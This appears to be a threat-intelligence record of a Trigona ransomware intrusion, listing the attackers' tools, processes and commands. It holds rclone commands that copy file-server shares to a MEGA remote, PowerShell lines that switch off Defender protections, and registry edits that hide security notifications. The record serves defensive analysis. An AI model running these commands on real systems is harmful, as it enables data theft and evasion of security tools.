description: Threat actors gained RDP access and deployed Trigona ransomware with
  data exfiltration via rclone to Mega.io.
attribution: Unknown threat actor, likely an APT group
malware_families:
- Trigona
TTPs:
  processes:
  - DefenderOFF.bat
  - DefenderON.bat
  - ipall.bat
  - ipinfo.bat
  - ipwho.bat
  - openrdp.bat
  - newuser.bat
  - psNET.bat
  - start
  - konua
  - konvA.bat
  - konus.bat
  - Trigona
  - Ransomware
  - build_redacted.exe
  - netscan.exe
  - rclone.exe
  - whoami.exenet.exe
  commandline:
  - cmd /c "C:\\Users\\Administrator\\Music\\start .bat" --> cd %~dp0 --> rclone.exe
    copy "\\[FILE SERVER]\\human resources" MEGA:domain -q --ignore-existing --auto-confirm
    --multi-thread-streams 12 --transfers 12
  - cmd /c "C:\\Users\\Administrator\\Music\\start    .bat" --> cd %~dp0 --> rclone.exe
    copy "\\[FILE SERVER]\\Files" MEGA:domain -q --ignore-existing --auto-confirm
    --multi-thread-streams 12 --transfers 12
  powershell:
  - Set-MpPreference -DisableRealtimeMonitoring $true
  - Set-MpPreference -MAPSReporting 0
  - Set-MpPreference -SubmitSamplesConsent 2
  scripting_engine:
  - batch scripts
  registry_keys:
  - REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
    /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
  - REG ADD "HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer" /v "DisableNotificationCenter"
    /t REG_DWORD /d 0x1 /f
  - REG DELETE "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth"
